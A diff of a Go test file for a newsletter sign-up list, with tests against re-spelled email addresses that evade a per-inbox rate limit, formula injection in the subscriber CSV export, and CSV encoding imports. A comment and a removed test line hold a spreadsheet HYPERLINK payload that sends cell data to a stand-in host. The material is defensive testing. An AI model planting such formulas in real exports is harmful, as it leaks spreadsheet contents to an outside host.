@@ -11,6 +11,8 @@ import (
 	"strings"
 	"testing"
 	"time"
+
+	"github.com/quilzo/quilzo/internal/sheet"
 )
 
 func openList(t *testing.T) *List {
@@ -132,27 +134,33 @@ func TestOneInboxIsMailedOnceAnHourHoweverItIsSpelled(t *testing.T) {
 }
 
 // What a mail relay reads past before it delivers is read past here too: a
-// final dot on the domain, quoting and comments. Each of these spellings
-// was an inbox of its own, with an hour of its own, and the relay delivers
-// every one to victim@gmail.com: the dot alone gave Gmail's dots back,
-// one spelling a link for every place a dot can go.
+// final dot on the domain and comments. Each of these spellings was an
+// inbox of its own, with an hour of its own, and the relay delivers every
+// one to victim@gmail.com: the dot alone gave Gmail's dots back, one
+// spelling a link for every place a dot can go. A quoted local part is not
+// an address at all now, by the rule a form, a booking and a record's email
+// field share, so it is refused before it can be a spelling of anything.
 func TestAnInboxIsNotRespelledByWhatTheRelayReadsPast(t *testing.T) {
 	l := openList(t)
 	if _, out, err := l.SignUp(Subscriber{Email: "victim@gmail.com"}, t0); err != nil || out != Mail {
 		t.Fatalf("the first sign-up: %v %v", out, err)
 	}
 	for i, spelling := range []string{"v.ictim@gmail.com.", "vi.ctim+1@GMAIL.COM.", "vic.tim@googlemail.com..",
-		`"victim"@gmail.com`, `"v.ictim+2"@gmail.com`, `"vic\tim"@gmail.com`,
 		"victim(1)@gmail.com", "victim@gmail.com(2)", "victim@(3)gmail.com", "vic((4))tim@gmail.com"} {
 		if _, out, err := l.SignUp(Subscriber{Email: spelling}, t0.Add(time.Duration(i+1)*time.Minute)); err != nil || out != Quiet {
 			t.Errorf("%s, within the hour of a link to the same inbox: %v %v", spelling, out, err)
+		}
+	}
+	for _, quoted := range []string{`"victim"@gmail.com`, `"v.ictim+2"@gmail.com`, `"vic\tim"@gmail.com`, `"ann"@example.com`} {
+		if _, out, err := l.SignUp(Subscriber{Email: quoted}, t0.Add(15*time.Minute)); !errors.Is(err, ErrAddress) || out == Mail {
+			t.Errorf("%s was taken as an address: %v %v", quoted, out, err)
 		}
 	}
 	// Kept as typed, and other inboxes are still their own.
 	if s, err := l.Get(l.ID("v.ictim@gmail.com.")); err != nil || s.Email != "v.ictim@gmail.com." {
 		t.Fatalf("the address as typed: %+v %v", s, err)
 	}
-	for _, other := range []string{"victim2@gmail.com.", `"ann"@example.com`, "a.nn@example.com."} {
+	for _, other := range []string{"victim2@gmail.com.", "ann@example.com", "a.nn@example.com."} {
 		if _, out, _ := l.SignUp(Subscriber{Email: other}, t0.Add(20*time.Minute)); out != Mail {
 			t.Errorf("%s was not mailed: another inbox's hour held it", other)
 		}
@@ -558,14 +566,15 @@ func TestAnImportHonoursWhoLeftWhereverTheyLeft(t *testing.T) {
 // off again.
 //
 // Only the name and the consent were guarded. An address is the visitor's
-// to type, and =HYPERLINK("http://evil.example/?"&B2)@x.example passes the
+// to type, and =HYPERLINK("http://evil.example/?"&B2)@x.example passed the
 // address check, so once confirmed it went out as a formula in the very
 // file a site's owner opens in a spreadsheet to look at their list. And
 // the names the export did guard came back from an import with the
-// apostrophe still on.
+// apostrophe still on. The one address rule refuses the quotes in that
+// one now; a formula without them is still an address.
 func TestAnAddressThatLooksLikeAFormulaIsGuardedInTheSubscriberExport(t *testing.T) {
 	t0 := time.Date(2026, 11, 4, 9, 0, 0, 0, time.UTC)
-	evil := `=hyperlink("http://evil.example/?"&b2)@x.example`
+	evil := `=hyperlink(b2&c2)@x.example`
 	if _, err := Normalize(evil); err != nil {
 		t.Fatalf("control: the address check refuses %q, so it cannot be on a list: %v", evil, err)
 	}
@@ -602,5 +611,49 @@ func TestAnAddressThatLooksLikeAFormulaIsGuardedInTheSubscriberExport(t *testing
 		if r.Email != list[i].Email || r.Name != list[i].Name {
 			t.Errorf("row %d came back as %q %q, not %q %q", i+1, r.Email, r.Name, list[i].Email, list[i].Name)
 		}
+	}
+}
+
+// A list Excel saved as "Unicode Text" (UTF-16, between tabs) was refused,
+// "no column is an email address", and one an older Excel saved as
+// Windows-1252 came in with each é and ç turned into U+FFFD in the names.
+// records import read both. There is one reader of a CSV's bytes, sheet's,
+// and the newsletter reads through it.
+func TestASubscriberListSavedAsUnicodeTextImports(t *testing.T) {
+	utf16 := func(s string) string {
+		b := []byte{0xFF, 0xFE}
+		for _, u := range []rune(s) {
+			b = append(b, byte(u), byte(u>>8))
+		}
+		return string(b)
+	}
+	for name, file := range map[string]string{
+		"UTF-16, as Excel saves Unicode Text": utf16("email\tname\r\nzoe@example.org\tZoé Müller\r\n"),
+		"Windows-1252, as older Excel saves":  "email,name\r\nzoe@example.org,Zo\xe9 M\xfcller\r\n",
+		"sep=, as Excel writes first":         "sep=;\nemail;name\nzoe@example.org;Zoé Müller\n",
+	} {
+		rows, err := ReadCSV(strings.NewReader(file))
+		if err != nil {
+			t.Errorf("%s: %v", name, err)
+			continue
+		}
+		if len(rows) != 1 || rows[0].Email != "zoe@example.org" || rows[0].Name != "Zoé Müller" {
+			t.Errorf("%s: read as %+v", name, rows)
+		}
+	}
+}
+
+// The newsletter and records import split a CSV's cells alike. The
+// newsletter counted separators on the first line without minding quotes,
+// so a heading with semicolons inside its quotes made it split a comma
+// separated list on semicolons, and no column was the address any more.
+func TestTheNewsletterAndRecordsReadTheSameCSVAlike(t *testing.T) {
+	file := "email,\"note; kept; as; written\",name\nann@example.com,\"met; at; the; fair\",Ann Lee\n"
+	if _, comma := sheet.Text([]byte(file)); comma != ',' {
+		t.Fatalf("records read the cells as split by %q", comma)
+	}
+	rows, err := ReadCSV(strings.NewReader(file))
+	if err != nil || len(rows) != 1 || rows[0].Email != "ann@example.com" || rows[0].Name != "Ann Lee" {
+		t.Fatalf("the newsletter read %v %+v", err, rows)
 	}
 }
